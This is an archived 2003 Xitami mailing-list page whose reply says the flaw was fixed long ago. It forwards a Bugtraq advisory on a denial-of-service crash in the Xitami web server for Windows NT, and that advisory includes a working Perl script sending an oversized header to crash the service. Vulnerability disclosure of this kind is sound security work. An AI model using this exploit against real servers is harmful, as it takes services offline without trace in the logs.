@@ -1,0 +1,187 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="005329.html">
+   <LINK REL="Next"  HREF="005331.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+   </H1>
+    <B>patricko
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server">xitami@lists.xitami.org
+       </A><BR>
+    <I>Mon, 22 Sep 2003 13:18:01 -0600</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="005329.html">[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+</A></li>
+        <LI> Next message: <A HREF="005331.html">[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#5330">[ date ]</a>
+              <a href="thread.html#5330">[ thread ]</a>
+              <a href="subject.html#5330">[ subject ]</a>
+              <a href="author.html#5330">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>This was fixed a long time ago that is way newer versions are available just
+ran this test and no problems here
+
+
+----- Original Message ----- 
+From: &quot;Josh A&quot; &lt;<A HREF="mailto:beta@coaxial.ca">beta@coaxial.ca</A>&gt;
+To: &lt;<A HREF="mailto:xitami@lists.xitami.org">xitami@lists.xitami.org</A>&gt;
+Sent: Monday, September 22, 2003 10:16 AM
+Subject: [Xitami] Fwd: Denial of service vulnerability in Xitami Open Source
+Web Server
+
+
+|<i>
+</I>|<i> -----Original Message-----
+</I>|<i> From: Oliver Karow &lt;<A HREF="mailto:Oliver.karow@gmx.de">Oliver.karow@gmx.de</A>&gt;
+</I>|<i> To: <A HREF="mailto:bugtraq@securityfocus.com">bugtraq@securityfocus.com</A>
+</I>|<i> Date: Mon, 22 Sep 2003 14:28:05 +0200
+</I>|<i> Subject: Denial of service vulnerability in Xitami Open Source Web Server
+</I>|<i>
+</I>|<i> Denial of service vulnerability in Xitami Open Source Web Server
+</I>|<i> ================================================================
+</I>|<i>
+</I>|<i> Date: 22.09.2003
+</I>|<i> =====
+</I>|<i>
+</I>|<i>
+</I>|<i> Affected Systems
+</I>|<i> ================
+</I>|<i>
+</I>|<i> The vulnerability was discovered on several versions (production and
+</I>|<i> beta) of Xitami
+</I>|<i> webserver for Windows NT:
+</I>|<i>
+</I>|<i> - Xitami 2.5B4 (bw3225b4.exe)
+</I>|<i> - Xitami 2.5B4 (bs3225b4.exe)
+</I>|<i> - Xitami 2.4D9 (bw3224d9.exe)
+</I>|<i>
+</I>|<i> I did no tests with the other versions and os/platforms (OS/2, Alpha,
+</I>|<i> OpenVMS, Unix).
+</I>|<i> Therfore i can't confirm that the vulnerability exists there.
+</I>|<i>
+</I>|<i> The Problem
+</I>|<i> ===========
+</I>|<i>
+</I>|<i> Xitami is a multiplatform open source web server and the flagship of
+</I>|<i> iMatix.
+</I>|<i> The services crashes when it receives a http get request (to a .shtm
+</I>|<i> file) with
+</I>|<i> a header field of &gt;= 5154 bytes, followed by a &quot;:&quot;.
+</I>|<i>
+</I>|<i> Xitami dies due to a Microsoft Visual C++ Runtime Error, an
+</I>|<i> abnormal program termination inside XIWIN32.EXE has occurred.
+</I>|<i> The message is *not* followed by any Win32 exception dialog.
+</I>|<i>
+</I>|<i> Vendor:
+</I>|<i> =======
+</I>|<i>
+</I>|<i> iMatix was informed about the vulnerability on 04.09.2003 and 05.09.2003
+</I>|<i> via email.
+</I>|<i> Up to now, i did not receive an answer from iMatix :(
+</I>|<i>
+</I>|<i> You can visit the vendors webpage here:
+</I>|<i>
+</I>|<i> <A HREF="http://www.ximati.com">http://www.ximati.com</A>
+</I>|<i> <A HREF="http://www.imatix.com">http://www.imatix.com</A>
+</I>|<i>
+</I>|<i> Other Notes
+</I>|<i> ===========
+</I>|<i> Unlike some server crashes, the service process will *not* recover from
+</I>|<i> the crash
+</I>|<i> caused by the attack.
+</I>|<i>
+</I>|<i> Successful exploitation of this vulnerability will NOT be logged, as the
+</I>|<i> service crashes.
+</I>|<i>
+</I>|<i> It seems also not to be clear, what the actual production and beta
+</I>|<i> release
+</I>|<i> versions are.
+</I>|<i> At <A HREF="http://www.xitami.com/download.htm,">http://www.xitami.com/download.htm,</A> the current production is 2.4d9
+</I>|<i> and the current
+</I>|<i> beta is 2.5b5.
+</I>|<i> At the same time, at <A HREF="http://www.imatix.com/html/xitami/index2.htm,">http://www.imatix.com/html/xitami/index2.htm,</A> the
+</I>|<i> current
+</I>|<i> production is 2.5b4 and the current beta is 2.5b4?!?
+</I>|<i>
+</I>|<i> Author:
+</I>|<i> =======
+</I>|<i> Oliver Karow (oliver.karow[at]gmx.de)
+</I>|<i>
+</I>|<i> Exploitation
+</I>|<i> ============
+</I>|<i>
+</I>|<i> #!/usr/local/bin/perl
+</I>|<i> #
+</I>|<i> # Simple exploit for Imatix Xitami Webserver on Windows NT
+</I>|<i> #
+</I>|<i> # Sending a GET request for a *.shtm file with a header field of &gt;= 5154
+</I>|<i> bytes, followed by a &quot;:&quot;,
+</I>|<i> # will crash the service.
+</I>|<i> #
+</I>|<i> # Vulnerable versions:
+</I>|<i> # - Xitami 2.5B4 (bw3225b4.exe)
+</I>|<i> # - Xitami 2.5B4 (bs3225b4.exe)
+</I>|<i> # - Xitami 2.4D9 (bw3224d9.exe)
+</I>|<i> # - others?
+</I>|<i> #
+</I>|<i> # For legal purposes only !
+</I>|<i> #
+</I>|<i> # 22.09.2003 - Oliver Karow - oliver.karow[AT]gmx.de
+</I>|<i>
+</I>|<i> use IO::Socket;
+</I>|<i>
+</I>|<i> $ip=&quot;127.0.0.1&quot;;
+</I>|<i> $port=80;
+</I>|<i>
+</I>|<i> $var=&quot;A&quot; x 5157;
+</I>|<i>
+</I>|<i> $mySocket=IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;$ip,
+</I>|<i> PeerPort=&gt;$port, Timeout=&gt;5);
+</I>|<i> $mySocket-&gt;autoflush(1);
+</I>|<i>   print $mySocket &quot;GET /test.shtm HTTP/1.0\r\n&quot;.
+</I>|<i>         $var.&quot;: */*\r\n\r\n&quot;;
+</I>|<i>
+</I>|<i> @answer=&lt;$mySocket&gt;;
+</I>|<i> $length=@answer;
+</I>|<i> if ($length==0){die &quot;\nService killed!\n&quot;;}
+</I>|<i> print @answer;
+</I>|<i>
+</I>|<i>
+</I>|<i> --
+</I>|<i> Xitami Users Mailing List -- For Xitami support
+</I>|<i> To unsubscribe: <A HREF="http://lists.xitami.org/mailman/listinfo/xitami">http://lists.xitami.org/mailman/listinfo/xitami</A>
+</I>
+
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="005329.html">[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+</A></li>
+	<LI> Next message: <A HREF="005331.html">[Xitami] Fwd: Denial of service vulnerability in Xitami Open Source Web Server
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#5330">[ date ]</a>
+              <a href="thread.html#5330">[ thread ]</a>
+              <a href="subject.html#5330">[ subject ]</a>
+              <a href="author.html#5330">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
